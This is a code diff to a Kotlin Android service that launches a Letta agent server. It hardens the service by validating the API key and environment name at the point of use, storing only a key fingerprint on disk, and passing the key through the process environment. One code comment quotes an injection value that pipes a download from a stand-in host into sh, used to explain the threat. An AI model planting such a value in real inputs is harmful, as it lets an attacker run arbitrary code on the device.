@@ -56,6 +56,21 @@ class LettaEnvironmentService : Service() {
     internal enum class PendingOp { UPGRADE, RESTART, SHUTDOWN }
 
     companion object {
+        // Security sink validation (adversarial review Oct 8): these values
+        // are interpolated into a generated shell script and into process
+        // environments. The on-screen input path validates (MainActivity),
+        // but the watch key-sync listener and any future write path did NOT —
+        // a forged wearable message could plant a key like `x; curl evil | sh; #`
+        // that executed at every server start. The sink must enforce its own
+        // contract; input-path validation is UX, not security.
+        val KEY_REGEX: Regex = Regex("^sk-let-[A-Za-z0-9+/=_-]{20,}$")
+        val ENV_REGEX: Regex = Regex("^[a-z0-9][a-z0-9-_]{0,63}$")
+        /** Null unless the key matches the strict shape. Use at every sink. */
+        fun validatedKey(raw: String?): String? =
+            raw?.trim()?.takeIf { KEY_REGEX.matches(it) }
+        /** Null unless the env name matches the strict shape. */
+        fun validatedEnv(raw: String?): String? =
+            raw?.trim()?.takeIf { ENV_REGEX.matches(it) }
         // Dedicated channel for the persistent environment-running notification so users
         // can control it independently from any future alert channels.
         private const val CHANNEL_ID = "letta-env-status"
@@ -471,7 +486,11 @@ class LettaEnvironmentService : Service() {
     private fun configChanged(): Boolean {
         val snap = File(filesDir, ".launch-config")
         if (!snap.exists()) return true
-        val expected = "${apiKey()}\n${envName()}"
+        // Mirrors the fingerprint write in runEnvironment() (Oct 8 security:
+        // no plaintext key on disk — env name + key fingerprint only).
+        val keyFp = java.security.MessageDigest.getInstance("SHA-256")
+            .digest(apiKey().toByteArray()).take(4).joinToString("") { "%02x".format(it) }
+        val expected = "$keyFp\n${envName()}"
         return snap.readText() != expected
     }
 
@@ -761,6 +780,23 @@ class LettaEnvironmentService : Service() {
     }
 
     private fun runEnvironment() {
+        // Security sink validation (Oct 8 review): refuse to launch with a
+        // key or env name outside the strict shape — no matter which write
+        // path stored it. The generated script interpolates envName() into a
+        // single-quoted shell context; an invalid value is a launch-killer,
+        // never a payload.
+        if (LettaEnvironmentService.validatedKey(apiKey()) == null) {
+            setStatus("invalid api key shape — reconfigure in the app")
+            updateNotification("Needs valid API key")
+            log("API key failed sink validation; launch blocked. Re-enter the key in the app.")
+            return
+        }
+        if (LettaEnvironmentService.validatedEnv(envName()) == null) {
+            setStatus("invalid env name — reconfigure in the app")
+            updateNotification("Needs valid env name")
+            log("Env name failed sink validation; launch blocked. Re-enter it in the app.")
+            return
+        }
         if (apiKey().isBlank()) {
             setStatus("no api key — open the app to configure")
             updateNotification("Needs API key")
@@ -866,7 +902,6 @@ class LettaEnvironmentService : Service() {
             // program (ENOEXEC on Android). The wrapper lives in files/bin/letta.
             "export LETTA_CODE_BIN=${bashDir.absolutePath}/letta\n" +
             "export TERM=dumb\n" +
-            "export LETTA_API_KEY=${apiKey()}\n" +
             "export LD_LIBRARY_PATH=$combinedPath\n" +
             "export NODE_OPTIONS=\"--require ${File(filesDir, "fs-shim.js").absolutePath} --require ${File(filesDir, "dns-shim.js").absolutePath}\"\n" +
             "export UV_USE_IO_URING=0\n" +
@@ -895,8 +930,20 @@ class LettaEnvironmentService : Service() {
 
         // Snapshot the config this server launches with: re-key / rename while
         // running must trigger a restart (configChanged), not a silent ignore.
-        File(filesDir, ".launch-config").writeText("${apiKey()}\n${envName()}")
+        // Security (Oct 8 review): the key no longer lives on disk here —
+        // agent-readable files must not hold credentials. Config-change
+        // detection uses the env name + key fingerprint (first 8 chars of
+        // a hash — enough to detect re-key, reveals nothing).
+        val keyFp = java.security.MessageDigest.getInstance("SHA-256")
+            .digest(apiKey().toByteArray()).take(4).joinToString("") { "%02x".format(it) }
+        File(filesDir, ".launch-config").writeText("${keyFp}\n${envName()}")
 
+        // Security (Oct 8 review): the API key reaches the server through
+        // the process environment — NOT through the generated script, whose
+        // file is readable by the agent shell (one `cat` away from exfil).
+        // ProcessBuilder env vars live in the kernel's copy of this process's
+        // env; the script file on disk never contains the credential.
+        pb.environment()["LETTA_API_KEY"] = apiKey()
         val p = pb.start()
         proc = p
         lifecycle.set(State.RUNNING)
